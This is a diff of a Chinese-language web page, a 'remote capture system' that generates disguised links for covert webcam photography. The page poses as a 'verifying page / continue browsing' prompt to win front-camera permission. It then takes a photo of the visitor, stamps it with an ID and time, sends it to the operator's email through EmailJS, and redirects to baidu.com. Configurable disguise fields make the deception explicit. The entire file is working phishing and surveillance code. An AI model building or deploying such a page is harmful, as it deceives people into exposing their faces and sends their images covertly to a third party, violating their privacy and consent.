@@ -1,526 +1,491 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>远程拍摄系统</title>
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        
-        html, body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            width: 100%;
-            min-height: 100%;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-        }
-        
-        body {
-            padding: 20px;
-            -webkit-text-size-adjust: 100%;
-        }
-        
-        .container {
-            background: white;
-            border-radius: 16px;
-            padding: 24px;
-            max-width: 600px;
-            margin: 0 auto 20px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
-            position: relative;
-            z-index: 1;
-        }
-        
-        h1 { 
-            text-align: center; 
-            color: #333; 
-            margin-bottom: 24px; 
-            font-size: 22px; 
-        }
-        
-        .form-group { 
-            margin-bottom: 16px; 
-        }
-        
-        label { 
-            display: block; 
-            margin-bottom: 6px; 
-            color: #555; 
-            font-weight: 500; 
-            font-size: 14px; 
-        }
-        
-        input, select, textarea {
-            width: 100%;
-            padding: 10px 12px;
-            border: 2px solid #e0e0e0;
-            border-radius: 8px;
-            font-size: 14px;
-            -webkit-appearance: none;
-            appearance: none;
-        }
-        
-        input:focus, select:focus, textarea:focus {
-            outline: none;
-            border-color: #667eea;
-        }
-        
-        .btn {
-            width: 100%;
-            padding: 12px;
-            border: none;
-            border-radius: 8px;
-            font-size: 15px;
-            cursor: pointer;
-            margin-top: 10px;
-            font-weight: 600;
-            -webkit-appearance: none;
-            appearance: none;
-        }
-        
-        .btn-primary {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-        }
-        
-        .btn-success { 
-            background: #28a745; 
-            color: white; 
-        }
-        
-        .link-box {
-            margin-top: 16px;
-            padding: 12px;
-            background: #f8f9fa;
-            border-radius: 8px;
-            border: 1px dashed #ccc;
-            word-break: break-all;
-        }
-        
-        .link-box a {
-            color: #667eea;
-            text-decoration: none;
-            font-size: 12px;
-        }
-        
-        #copyBtn, #copyAliasBtn { 
-            display: none; 
-        }
-        
-        .section-title {
-            font-size: 14px;
-            font-weight: 600;
-            color: #667eea;
-            margin: 20px 0 10px 0;
-            border-bottom: 1px solid #eee;
-            padding-bottom: 6px;
-        }
-        
-        .alias-box {
-            margin-top: 10px;
-            padding: 10px;
-            background: #e8f4fd;
-            border-radius: 6px;
-            display: none;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>远程拍摄系统</title>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+html, body {
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+  width: 100%;
+  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+}
+body {
+  padding: 20px;
+  -webkit-text-size-adjust: 100%;
+}
+.container {
+  background: white;
+  border-radius: 16px;
+  padding: 24px;
+  max-width: 600px;
+  margin: 0 auto 20px;
+  box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+}
+h1 { text-align: center; color: #333; margin-bottom: 24px; font-size: 22px; }
+.form-group { margin-bottom: 16px; }
+label { display: block; margin-bottom: 6px; color: #555; font-weight: 500; font-size: 14px; }
+input {
+  width: 100%;
+  padding: 10px 12px;
+  border: 2px solid #e0e0e0;
+  border-radius: 8px;
+  font-size: 14px;
+  -webkit-appearance: none;
+}
+input:focus { outline: none; border-color: #667eea; }
+.btn {
+  width: 100%;
+  padding: 12px;
+  border: none;
+  border-radius: 8px;
+  font-size: 15px;
+  cursor: pointer;
+  margin-top: 10px;
+  font-weight: 600;
+  -webkit-appearance: none;
+}
+.btn-primary {
+  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+  color: white;
+}
+.btn-success { background: #28a745; color: white; }
+.link-box {
+  margin-top: 16px;
+  padding: 12px;
+  background: #f8f9fa;
+  border-radius: 8px;
+  border: 1px dashed #ccc;
+  word-break: break-all;
+}
+.link-box a { color: #667eea; text-decoration: none; font-size: 12px; }
+#copyBtn, #copyAliasBtn { display: none; }
+.section-title {
+  font-size: 14px;
+  font-weight: 600;
+  color: #667eea;
+  margin: 20px 0 10px 0;
+  border-bottom: 1px solid #eee;
+  padding-bottom: 6px;
+}
+.alias-box {
+  margin-top: 10px;
+  padding: 10px;
+  background: #e8f4fd;
+  border-radius: 6px;
+  display: none;
+}
+.capture-page {
+  display: none;
+  background: #1a1a2e;
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  padding: 40px 20px;
+  text-align: center;
+  color: white;
+  overflow-y: auto;
+  z-index: 9999;
+}
+.capture-page h2 { font-size: 22px; margin-bottom: 20px; }
+#video {
+  width: 100%;
+  max-width: 400px;
+  border-radius: 12px;
+  margin-bottom: 20px;
+  transform: scaleX(-1);
+}
+#canvas { display: none; }
+.status { font-size: 16px; margin: 20px 0; }
+.btn-allow {
+  background: #667eea;
+  color: white;
+  padding: 16px 40px;
+  border: none;
+  border-radius: 30px;
+  font-size: 18px;
+  cursor: pointer;
+  margin-top: 20px;
+  -webkit-appearance: none;
+}
+.warning-box {
+  background: rgba(255,200,0,0.2);
+  border: 1px solid #ffc800;
+  border-radius: 8px;
+  padding: 12px;
+  margin: 15px auto;
+  color: #ffc800;
+  max-width: 400px;
+  display: none;
+}
+#previewImg {
+  width: 100%;
+  max-width: 400px;
+  border-radius: 12px;
+  margin: 15px auto;
+  display: none;
+}
+.share-btns { display: none; margin-top: 20px; }
+.btn-share {
+  background: #28a745;
+  color: white;
+  padding: 16px 30px;
+  border: none;
+  border-radius: 30px;
+  font-size: 18px;
+  cursor: pointer;
+  width: 100%;
+  max-width: 300px;
+  margin-bottom: 10px;
+  -webkit-appearance: none;
+}
+.btn-skip {
+  background: rgba(255,255,255,0.2);
+  color: white;
+  padding: 12px 30px;
+  border: 1px solid rgba(255,255,255,0.4);
+  border-radius: 30px;
+  font-size: 14px;
+  cursor: pointer;
+  width: 100%;
+  max-width: 300px;
+  -webkit-appearance: none;
+}
+</style>
+</head>
+<body>
 
-        .capture-page {
-            display: none;
-            background: #1a1a2e;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            padding: 40px 20px;
-            text-align: center;
-            color: white;
-            overflow-y: auto;
-            z-index: 100;
-        }
-        
-        .capture-page h2 { 
-            font-size: 22px; 
-            margin-bottom: 20px; 
-        }
-        
-        #video {
-            width: 100%;
-            max-width: 400px;
-            border-radius: 12px;
-            margin-bottom: 20px;
-            transform: scaleX(-1);
-        }
-        
-        #canvas { 
-            display: none; 
-        }
-        
-        .status { 
-            font-size: 16px; 
-            margin: 20px 0; 
-        }
-        
-        .btn-allow {
-            background: #667eea;
-            color: white;
-            padding: 16px 40px;
-            border: none;
-            border-radius: 30px;
-            font-size: 18px;
-            cursor: pointer;
-            margin-top: 20px;
-            -webkit-appearance: none;
-            appearance: none;
-        }
-        
-        .warning-box {
-            background: rgba(255,200,0,0.2);
-            border: 1px solid #ffc800;
-            border-radius: 8px;
-            padding: 12px;
-            margin: 15px auto;
-            color: #ffc800;
-            max-width: 400px;
-            display: none;
-        }
-        
-        #previewImg {
-            width: 100%;
-            max-width: 400px;
-            border-radius: 12px;
-            margin: 15px auto;
-            display: none;
-        }
-        
-    <div id="mainPage">
-        <div class="container">
-            <h1>📷 远程拍摄系统</h1>
-            
-            <div class="form-group">
-                <label>输入ID：</label>
-                <input type="text" id="myid" placeholder="输入您的ID"/>
-            </div>
-            
-            <div class="form-group">
-                <label>拍摄后跳转到：</label>
-                <input type="text" id="url" value="http://baidu.com"/>
-            </div>
-
-            <div class="section-title">EmailJS 配置（可选，用于自动发邮件）</div>
-            
-            <div class="form-group">
-                <label>Service ID：</label>
-                <input type="text" id="ejsService" placeholder="service_xxx"/>
-            </div>
-            
-            <div class="form-group">
-                <label>Template ID：</label>
-                <input type="text" id="ejsTemplate" placeholder="template_xxx"/>
-            </div>
-            
-            <div class="form-group">
-                <label>Public Key：</label>
-                <input type="text" id="ejsKey" placeholder="xxx"/>
-            </div>
-            
-            <div class="form-group">
-                <label>接收邮箱：</label>
-                <input type="text" id="ejsEmail" placeholder="你的邮箱@qq.com"/>
-            </div>
-
-            <div class="section-title">伪装设置（可选）</div>
-            
-            <div class="form-group">
-                <label>页面标题：</label>
-                <input type="text" id="fakeTitle" value="页面加载中..."/>
-            </div>
-            
-            <div class="form-group">
-                <label>显示标题：</label>
-                <input type="text" id="fakeH1" value="正在验证页面..."/>
-            </div>
-            
-            <div class="form-group">
-                <label>描述文字：</label>
-                <input type="text" id="fakeDesc" value="点击按钮继续浏览页面"/>
-            </div>
-            
-            <div class="form-group">
-                <label>按钮文字：</label>
-                <input type="text" id="fakeBtn" value="继续浏览"/>
-            </div>
-
-            <div class="section-title">链接别名（可选）</div>
-            
-            <div class="form-group">
-                <label>自定义链接显示名称：</label>
-                <input type="text" id="linkAlias" placeholder="例如：直播入口、视频验证"/>
-            </div>
-
-            <button class="btn btn-primary" onclick="generateLink()">生成链接</button>
-            
-            <div class="link-box">
-                <label style="font-size:12px;color:#666;">原始链接：</label><br>
-                <a id="kd" style="pointer-events: none; color: #999;">请先生成链接！</a>
-            </div>
-            
-            <div class="alias-box" id="aliasBox">
-                <label style="font-size:12px;color:#0c5460;">别名链接：</label>
-                <input type="text" id="aliasUrl" readonly style="width:100%;margin-bottom:8px;"/>
-                <button class="btn btn-success" onclick="copyAlias()">复制别名链接</button>
-            </div>
-            
-            <button class="btn btn-success" id="copyBtn" onclick="copyToClipboard()">复制原始链接</button>
-        </div>
+<div id="mainPage">
+  <div class="container">
+    <h1>📷 远程拍摄系统</h1>
+    
+    <div class="form-group">
+      <label>输入ID：</label>
+      <input type="text" id="myid" placeholder="输入您的ID"/>
     </div>
-    <div class="capture-page" id="capturePage">
-        <h2 id="captureTitle">正在加载...</h2>
-        
-        <div class="warning-box" id="wechatTip">
-            ⚠️ 检测到微信浏览器<br>请按右上角 ⋮ 选择"在浏览器打开"
-        </div>
-        
-        <video id="video" autoplay playsinline muted></video>
-        <canvas id="canvas"></canvas>
-        <img id="previewImg" alt="拍摄结果"/>
-        
-        <div class="status" id="status">请允许摄像头权限以继续</div>
-        
-        <button class="btn-allow" id="allowBtn" onclick="startCapture()">继续浏览</button>
-        
-        <div class="share-btns" id="shareSection">
-            <p style="margin-bottom:12px;">✅ 照片已拍摄并保存到本地</p>
-            <button class="btn-share" onclick="sharePhoto()">📤 发送照片给好友</button>
-            <button class="btn-skip" onclick="skipShare()">跳过，直接跳转</button>
-        </div>
+    
+    <div class="form-group">
+      <label>拍摄后跳转到：</label>
+      <input type="text" id="url" value="http://baidu.com"/>
     </div>
 
-    <script>
-        var urlParams = new URLSearchParams(window.location.search);
-        var isCapture = urlParams.get('mode') === 'capture';
-        
-        if (isCapture) {
-            document.getElementById('mainPage').style.display = 'none';
-            document.getElementById('capturePage').style.display = 'block';
-            initCapture();
-        }
+    <div class="section-title">EmailJS 配置（可选，用于自动发邮件）</div>
+    
+    <div class="form-group">
+      <label>Service ID：</label>
+      <input type="text" id="ejsService" placeholder="service_xxx"/>
+    </div>
+    
+    <div class="form-group">
+      <label>Template ID：</label>
+      <input type="text" id="ejsTemplate" placeholder="template_xxx"/>
+    </div>
+    
+    <div class="form-group">
+      <label>Public Key：</label>
+      <input type="text" id="ejsKey" placeholder="xxx"/>
+    </div>
+    
+    <div class="form-group">
+      <label>接收邮箱：</label>
+      <input type="text" id="ejsEmail" placeholder="你的邮箱@qq.com"/>
+    </div>
 
-        function generateLink() {
-            var id = document.getElementById('myid').value.trim();
-            var targetUrl = document.getElementById('url').value.trim() || 'http://baidu.com';
-            var alias = document.getElementById('linkAlias').value.trim();
-            
-            if (!id) {
-                alert('请输入ID！');
-                return;
-            }
-            
-            if (!/^https?:\/\//i.test(targetUrl)) {
-                targetUrl = 'http://' + targetUrl;
-            }
-            
-            var ejsService = document.getElementById('ejsService').value.trim();
-            var ejsTemplate = document.getElementById('ejsTemplate').value.trim();
-            var ejsKey = document.getElementById('ejsKey').value.trim();
-            var ejsEmail = document.getElementById('ejsEmail').value.trim();
-            
-            var fakeTitle = document.getElementById('fakeTitle').value.trim();
-            var fakeH1 = document.getElementById('fakeH1').value.trim();
-            var fakeDesc = document.getElementById('fakeDesc').value.trim();
-            var fakeBtn = document.getElementById('fakeBtn').value.trim();
-            
-            var baseUrl = window.location.href.split('?')[0];
-            var fullLink = baseUrl + '?id=' + encodeURIComponent(id) + 
-                           '&target=' + encodeURIComponent(targetUrl) + 
-                           '&mode=capture';
-            
-            if (ejsService) fullLink += '&service=' + encodeURIComponent(ejsService);
-            if (ejsTemplate) fullLink += '&template=' + encodeURIComponent(ejsTemplate);
-            if (ejsKey) fullLink += '&key=' + encodeURIComponent(ejsKey);
-            if (ejsEmail) fullLink += '&email=' + encodeURIComponent(ejsEmail);
-            
-            if (fakeTitle) fullLink += '&ft=' + encodeURIComponent(fakeTitle);
-            if (fakeH1) fullLink += '&fh=' + encodeURIComponent(fakeH1);
-            if (fakeDesc) fullLink += '&fd=' + encodeURIComponent(fakeDesc);
-            if (fakeBtn) fullLink += '&fb=' + encodeURIComponent(fakeBtn);
-            
-            var kd = document.getElementById('kd');
-            kd.href = fullLink;
-            kd.textContent = fullLink;
-            kd.style.pointerEvents = 'auto';
-            kd.style.color = '#667eea';
-            
-            document.getElementById('copyBtn').style.display = 'block';
-            
-            if (alias) {
-                document.getElementById('aliasBox').style.display = 'block';
-                document.getElementById('aliasUrl').value = fullLink;
-            }
-        }
+    <div class="section-title">伪装设置（可选）</div>
+    
+    <div class="form-group">
+      <label>页面标题：</label>
+      <input type="text" id="fakeTitle" value="页面加载中..."/>
+    </div>
+    
+    <div class="form-group">
+      <label>显示标题：</label>
+      <input type="text" id="fakeH1" value="正在验证页面..."/>
+    </div>
+    
+    <div class="form-group">
+      <label>描述文字：</label>
+      <input type="text" id="fakeDesc" value="点击按钮继续浏览页面"/>
+    </div>
+    
+    <div class="form-group">
+      <label>按钮文字：</label>
+      <input type="text" id="fakeBtn" value="继续浏览"/>
+    </div>
 
-        function copyToClipboard() {
-            var link = document.getElementById('kd').href;
-            doCopy(link, '链接已复制');
-        }
-        
-        function copyAlias() {
-            var link = document.getElementById('aliasUrl').value;
-            doCopy(link, '别名链接已复制');
-        }
-        
-        function doCopy(text, msg) {
-            if (navigator.clipboard && window.isSecureContext) {
-                navigator.clipboard.writeText(text).then(function() {
-                    alert('✅ ' + msg);
-                });
-            } else {
-                var ta = document.createElement('textarea');
-                ta.value = text;
-                ta.style.position = 'fixed';
-                ta.style.left = '-9999px';
-                document.body.appendChild(ta);
-                ta.focus();
-                ta.select();
-                try {
-                    document.execCommand('copy');
-                    alert('✅ ' + msg);
-                } catch (err) {
-                    alert('❌ 复制失败，请手动复制');
-                }
-                document.body.removeChild(ta);
-            }
-        }
-        function initCapture() {
-            var urlParams = new URLSearchParams(window.location.search);
-            var target = urlParams.get('target') || 'http://baidu.com';
-            var id = urlParams.get('id') || 'unknown';
-            
-            var fakeH1 = urlParams.get('fh') || '正在验证页面...';
-            var fakeDesc = urlParams.get('fd') || '点击按钮继续浏览页面';
-            var fakeBtn = urlParams.get('fb') || '继续浏览';
-            
-            document.getElementById('captureTitle').textContent = fakeH1;
-            document.getElementById('status').textContent = fakeDesc;
-            document.getElementById('allowBtn').textContent = fakeBtn;
-            
-            if (/MicroMessenger/i.test(navigator.userAgent)) {
-                document.getElementById('wechatTip').style.display = 'block';
-                document.getElementById('captureTitle').style.display = 'none';
-                document.getElementById('status').style.display = 'none';
-                document.getElementById('allowBtn').style.display = 'none';
-            }
-        }
+    <div class="section-title">链接别名（可选）</div>
+    
+    <div class="form-group">
+      <label>自定义链接显示名称：</label>
+      <input type="text" id="linkAlias" placeholder="例如：直播入口、视频验证"/>
+    </div>
 
-        async function startCapture() {
-            var urlParams = new URLSearchParams(window.location.search);
-            var target = urlParams.get('target') || 'http://baidu.com';
-            var id = urlParams.get('id') || 'unknown';
-            var status = document.getElementById('status');
-            
-            var ejsService = urlParams.get('service');
-            var ejsTemplate = urlParams.get('template');
-            var ejsKey = urlParams.get('key');
-            var ejsEmail = urlParams.get('email');
-            
-            try {
-                var stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    }, 
-                    audio: false 
-                });
-                
-                var video = document.getElementById('video');
-                video.srcObject = stream;
-                
-                status.textContent = '正在准备拍摄...';
-                
-                video.onloadedmetadata = function() {
-                    setTimeout(function() {
-                        takePhoto(id, target, stream, ejsService, ejsTemplate, ejsKey, ejsEmail);
-                    }, 1500);
-                };
-                
-            } catch (err) {
-                console.error('摄像头访问失败:', err);
-                status.textContent = '无法访问摄像头，3秒后跳转...';
-                setTimeout(function() {
-                    window.location.href = target;
-                }, 3000);
-            }
-        }
-        function takePhoto(id, target, stream, ejsService, ejsTemplate, ejsKey, ejsEmail) {
-            var video = document.getElementById('video');
-            var canvas = document.getElementById('canvas');
-            var ctx = canvas.getContext('2d');
-            var status = document.getElementById('status');
-            
-            canvas.width = video.videoWidth || 1280;
-            canvas.height = video.videoHeight || 720;
-            
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            ctx.fillStyle = 'rgba(255, 255, 255, 0.9)';
-            ctx.font = 'bold 20px Arial';
-            ctx.fillText('ID: ' + id, 20, 35);
-            ctx.fillText('Time: ' + new Date().toLocaleString('zh-CN'), 20, 65);
-            
-            status.textContent = '拍摄完成，正在保存...';
-            
-            stream.getTracks().forEach(function(track) { track.stop(); });
-            video.style.display = 'none';
-            
-            var imgData = canvas.toDataURL('image/jpeg', 0.95);
-            
-            var preview = document.getElementById('previewImg');
-            preview.src = imgData;
-            preview.style.display = 'block';
-            
-            if (ejsService && ejsTemplate && ejsKey && ejsEmail) {
-                status.textContent = '正在发送照片到邮箱...';
-                sendEmail(imgData, id, ejsService, ejsTemplate, ejsKey, ejsEmail, target, status);
-            } else {
-                status.textContent = '照片已保存，即将跳转...';
-                setTimeout(function() {
-                    window.location.href = target;
-                }, 1500);
-            }
-        }
+    <button class="btn btn-primary" onclick="generateLink()">生成链接</button>
+    
+    <div class="link-box">
+      <label style="font-size:12px;color:#666;">原始链接：</label><br>
+      <a id="kd" style="pointer-events: none; color: #999;">请先生成链接！</a>
+    </div>
+    
+    <div class="alias-box" id="aliasBox">
+      <label style="font-size:12px;color:#0c5460;">别名链接：</label>
+      <input type="text" id="aliasUrl" readonly style="width:100%;margin-bottom:8px;"/>
+      <button class="btn btn-success" onclick="copyAlias()">复制别名链接</button>
+    </div>
+    
+    <button class="btn btn-success" id="copyBtn" onclick="copyToClipboard()">复制原始链接</button>
+  </div>
+</div>
+<div class="capture-page" id="capturePage">
+  <h2 id="captureTitle">正在加载...</h2>
+  
+  <div class="warning-box" id="wechatTip">
+    ⚠️ 检测到微信浏览器<br>请按右上角 ⋮ 选择"在浏览器打开"
+  </div>
+  
+  <video id="video" autoplay playsinline muted></video>
+  <canvas id="canvas"></canvas>
+  <img id="previewImg" alt="拍摄结果"/>
+  
+  <div class="status" id="status">请允许摄像头权限以继续</div>
+  
+  <button class="btn-allow" id="allowBtn" onclick="startCapture()">继续浏览</button>
+  
+  <div class="share-btns" id="shareSection">
+    <p style="margin-bottom:12px;">✅ 照片已拍摄并保存到本地</p>
+    <button class="btn-share" onclick="sharePhoto()">📤 发送照片给好友</button>
+    <button class="btn-skip" onclick="skipShare()">跳过，直接跳转</button>
+  </div>
+</div>
 
-        function sendEmail(imgData, id, service, template, key, email, target, statusEl) {
-            emailjs.init(key);
-            
-            emailjs.send(service, template, {
-                id: id,
-                time: new Date().toLocaleString('zh-CN'),
-                photo: imgData,
-                to_email: email
-            }).then(function() {
-                statusEl.textContent = '照片已发送到邮箱，即将跳转...';
-                setTimeout(function() {
-                    window.location.href = target;
-                }, 1500);
-            }).catch(function(err) {
-                console.error('邮件发送失败:', err);
-                statusEl.textContent = '邮件发送失败，照片已本地保存，3秒后跳转...';
-                setTimeout(function() {
-                    window.location.href = target;
-                }, 3000);
-            });
-        }
+<script>
+var urlParams = new URLSearchParams(window.location.search);
+var isCapture = urlParams.get('mode') === 'capture';
 
-        function sharePhoto() {
-            alert('请长按上方图片保存，然后手动发送');
-        }
+if (isCapture) {
+  document.getElementById('mainPage').style.display = 'none';
+  document.getElementById('capturePage').style.display = 'block';
+  initCapture();
+}
 
-        function skipShare() {
-            var urlParams = new URLSearchParams(window.location.search);
-            var target = urlParams.get('target') || 'http://baidu.com';
-            window.location.href = target;
-        }
-    </script>
+function generateLink() {
+  var id = document.getElementById('myid').value.trim();
+  var targetUrl = document.getElementById('url').value.trim() || 'http://baidu.com';
+  var alias = document.getElementById('linkAlias').value.trim();
+  
+  if (!id) {
+    alert('请输入ID！');
+    return;
+  }
+  
+  if (!/^https?:\/\//i.test(targetUrl)) {
+    targetUrl = 'http://' + targetUrl;
+  }
+  
+  var ejsService = document.getElementById('ejsService').value.trim();
+  var ejsTemplate = document.getElementById('ejsTemplate').value.trim();
+  var ejsKey = document.getElementById('ejsKey').value.trim();
+  var ejsEmail = document.getElementById('ejsEmail').value.trim();
+  
+  var fakeTitle = document.getElementById('fakeTitle').value.trim();
+  var fakeH1 = document.getElementById('fakeH1').value.trim();
+  var fakeDesc = document.getElementById('fakeDesc').value.trim();
+  var fakeBtn = document.getElementById('fakeBtn').value.trim();
+  
+  var baseUrl = window.location.href.split('?')[0];
+  var fullLink = baseUrl + '?id=' + encodeURIComponent(id) + 
+                 '&target=' + encodeURIComponent(targetUrl) + 
+                 '&mode=capture';
+  
+  if (ejsService) fullLink += '&service=' + encodeURIComponent(ejsService);
+  if (ejsTemplate) fullLink += '&template=' + encodeURIComponent(ejsTemplate);
+  if (ejsKey) fullLink += '&key=' + encodeURIComponent(ejsKey);
+  if (ejsEmail) fullLink += '&email=' + encodeURIComponent(ejsEmail);
+  
+  if (fakeTitle) fullLink += '&ft=' + encodeURIComponent(fakeTitle);
+  if (fakeH1) fullLink += '&fh=' + encodeURIComponent(fakeH1);
+  if (fakeDesc) fullLink += '&fd=' + encodeURIComponent(fakeDesc);
+  if (fakeBtn) fullLink += '&fb=' + encodeURIComponent(fakeBtn);
+  
+  var kd = document.getElementById('kd');
+  kd.href = fullLink;
+  kd.textContent = fullLink;
+  kd.style.pointerEvents = 'auto';
+  kd.style.color = '#667eea';
+  
+  document.getElementById('copyBtn').style.display = 'block';
+  
+  if (alias) {
+    document.getElementById('aliasBox').style.display = 'block';
+    document.getElementById('aliasUrl').value = fullLink;
+  }
+}
+
+function copyToClipboard() {
+  var link = document.getElementById('kd').href;
+  doCopy(link, '链接已复制');
+}
+
+function copyAlias() {
+  var link = document.getElementById('aliasUrl').value;
+  doCopy(link, '别名链接已复制');
+}
+
+function doCopy(text, msg) {
+  if (navigator.clipboard && window.isSecureContext) {
+    navigator.clipboard.writeText(text).then(function() {
+      alert('✅ ' + msg);
+    });
+  } else {
+    var ta = document.createElement('textarea');
+    ta.value = text;
+    ta.style.position = 'fixed';
+    ta.style.left = '-9999px';
+    document.body.appendChild(ta);
+    ta.focus();
+    ta.select();
+    try {
+      document.execCommand('copy');
+      alert('✅ ' + msg);
+    } catch (err) {
+      alert('❌ 复制失败，请手动复制');
+    }
+    document.body.removeChild(ta);
+  }
+}
+function initCapture() {
+  var urlParams = new URLSearchParams(window.location.search);
+  var target = urlParams.get('target') || 'http://baidu.com';
+  var id = urlParams.get('id') || 'unknown';
+  
+  var fakeH1 = urlParams.get('fh') || '正在验证页面...';
+  var fakeDesc = urlParams.get('fd') || '点击按钮继续浏览页面';
+  var fakeBtn = urlParams.get('fb') || '继续浏览';
+  
+  document.getElementById('captureTitle').textContent = fakeH1;
+  document.getElementById('status').textContent = fakeDesc;
+  document.getElementById('allowBtn').textContent = fakeBtn;
+  
+  if (/MicroMessenger/i.test(navigator.userAgent)) {
+    document.getElementById('wechatTip').style.display = 'block';
+    document.getElementById('captureTitle').style.display = 'none';
+    document.getElementById('status').style.display = 'none';
+    document.getElementById('allowBtn').style.display = 'none';
+  }
+}
+
+async function startCapture() {
+  var urlParams = new URLSearchParams(window.location.search);
+  var target = urlParams.get('target') || 'http://baidu.com';
+  var id = urlParams.get('id') || 'unknown';
+  var status = document.getElementById('status');
+  
+  var ejsService = urlParams.get('service');
+  var ejsTemplate = urlParams.get('template');
+  var ejsKey = urlParams.get('key');
+  var ejsEmail = urlParams.get('email');
+  
+  try {
+    var stream = await navigator.mediaDevices.getUserMedia({ 
+      video: { 
+        facingMode: 'user',
+        width: { ideal: 1280 },
+        height: { ideal: 720 }
+      }, 
+      audio: false 
+    });
+    
+    var video = document.getElementById('video');
+    video.srcObject = stream;
+    
+    status.textContent = '正在准备拍摄...';
+    
+    video.onloadedmetadata = function() {
+      setTimeout(function() {
+        takePhoto(id, target, stream, ejsService, ejsTemplate, ejsKey, ejsEmail);
+      }, 1500);
+    };
+    
+  } catch (err) {
+    console.error('摄像头访问失败:', err);
+    status.textContent = '无法访问摄像头，3秒后跳转...';
+    setTimeout(function() {
+      window.location.href = target;
+    }, 3000);
+  }
+}
+function takePhoto(id, target, stream, ejsService, ejsTemplate, ejsKey, ejsEmail) {
+  var video = document.getElementById('video');
+  var canvas = document.getElementById('canvas');
+  var ctx = canvas.getContext('2d');
+  var status = document.getElementById('status');
+  
+  canvas.width = video.videoWidth || 1280;
+  canvas.height = video.videoHeight || 720;
+  
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  
+  ctx.fillStyle = 'rgba(255, 255, 255, 0.9)';
+  ctx.font = 'bold 20px Arial';
+  ctx.fillText('ID: ' + id, 20, 35);
+  ctx.fillText('Time: ' + new Date().toLocaleString('zh-CN'), 20, 65);
+  
+  status.textContent = '拍摄完成，正在保存...';
+  
+  stream.getTracks().forEach(function(track) { track.stop(); });
+  video.style.display = 'none';
+  
+  var imgData = canvas.toDataURL('image/jpeg', 0.95);
+  
+  var preview = document.getElementById('previewImg');
+  preview.src = imgData;
+  preview.style.display = 'block';
+  
+  if (ejsService && ejsTemplate && ejsKey && ejsEmail) {
+    status.textContent = '正在发送照片到邮箱...';
+    sendEmail(imgData, id, ejsService, ejsTemplate, ejsKey, ejsEmail, target, status);
+  } else {
+    status.textContent = '照片已保存，即将跳转...';
+    setTimeout(function() {
+      window.location.href = target;
+    }, 1500);
+  }
+}
+
+function sendEmail(imgData, id, service, template, key, email, target, statusEl) {
+  emailjs.init(key);
+  
+  emailjs.send(service, template, {
+    id: id,
+    time: new Date().toLocaleString('zh-CN'),
+    photo: imgData,
+    to_email: email
+  }).then(function() {
+    statusEl.textContent = '照片已发送到邮箱，即将跳转...';
+    setTimeout(function() {
+      window.location.href = target;
+    }, 1500);
+  }).catch(function(err) {
+    console.error('邮件发送失败:', err);
+    statusEl.textContent = '邮件发送失败，照片已本地保存，3秒后跳转...';
+    setTimeout(function() {
+      window.location.href = target;
+    }, 3000);
+  });
+}
+
+function sharePhoto() {
+  alert('请长按上方图片保存，然后手动发送');
+}
+
+function skipShare() {
+  var urlParams = new URLSearchParams(window.location.search);
+  var target = urlParams.get('target') || 'http://baidu.com';
+  window.location.href = target;
+}
+</script>
+
 </body>
 </html>
